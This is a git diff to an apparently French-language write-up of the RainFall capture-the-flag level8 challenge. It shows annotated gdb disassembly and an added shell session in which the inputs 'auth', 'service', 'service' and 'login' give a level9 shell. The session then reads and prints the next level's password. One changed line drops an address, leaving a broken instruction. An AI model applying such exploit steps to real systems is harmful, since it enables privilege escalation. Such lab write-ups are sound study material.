@@ -10,6 +10,7 @@ dr-x--x--x  1 root   root    340 Sep 23  2015 ..
 -rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile
 ```
 
+auth aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ``` bash
 (gdb) disas main
 Dump of assembler code for function main:
@@ -26,7 +27,7 @@ Dump of assembler code for function main:
    0x08048581 <+29>:	mov    eax,0x8048810                # "%p, %p \n"
    0x08048586 <+34>:	mov    DWORD PTR [esp+0x8],ecx      # 3e arg # globale service ""
    0x0804858a <+38>:	mov    DWORD PTR [esp+0x4],edx      # 2e globale auth ""
-   0x0804858e <+42>:	mov    DWORD PTR [esp],eax          # "%p, %p \n"
+   0x0804858e <+42>:	mov    DWORD PTR [esp],eax          # "%p, %p \n" -> 0x804a008, 0x804a018
    0x08048591 <+45>:	call   0x8048410 <printf@plt>       # printf("%p, %p \n", auth, service)
    0x08048596 <+50>:	mov    eax,ds:0x8049a80         # stdin
    0x0804859b <+55>:	mov    DWORD PTR [esp+0x8],eax  # 3eem arg ftgets stdin
@@ -41,7 +42,7 @@ Dump of assembler code for function main:
    0x080485c1 <+93>:	mov    eax,0x8048819            # "auth"
    0x080485c6 <+98>:	mov    ecx,0x5                  # i = ecx (incrementeur)
    0x080485cb <+103>:	mov    esi,edx                  # buffer
-   0x080485cd <+105>:	mov    edi,eax                  # "auth"
+   0x080485cd <+105>:	mov    edi,eax                  # "auth "
    0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x080485d1 <+109>:	seta   dl                       # == 0
    0x080485d4 <+112>:	setb   al                       # == 1
@@ -128,7 +129,7 @@ Dump of assembler code for function main:
    0x080486d7 <+371>:	movsx  eax,al
    0x080486da <+374>:	test   eax,eax 
    0x080486dc <+376>:	jne    0x8048574 <main+16>
-   0x080486e2 <+382>:	mov    eax,ds:0x8049aac             # var auth
+   0x080486e2 <+382>:	mov    eax,ds:             # var auth
    0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20]     # if !auth+0x20
    0x080486ea <+390>:	test   eax,eax
    0x080486ec <+392>:	je     0x80486ff <main+411>
@@ -152,4 +153,20 @@ Dump of assembler code for function main:
    0x08048737 <+467>:	pop    ebp
    0x08048738 <+468>:	ret    
 
+```
+
+``` bash
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+service
+0x804a008, 0x804a018 
+service
+0x804a008, 0x804a028 
+login
+$ id
+uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
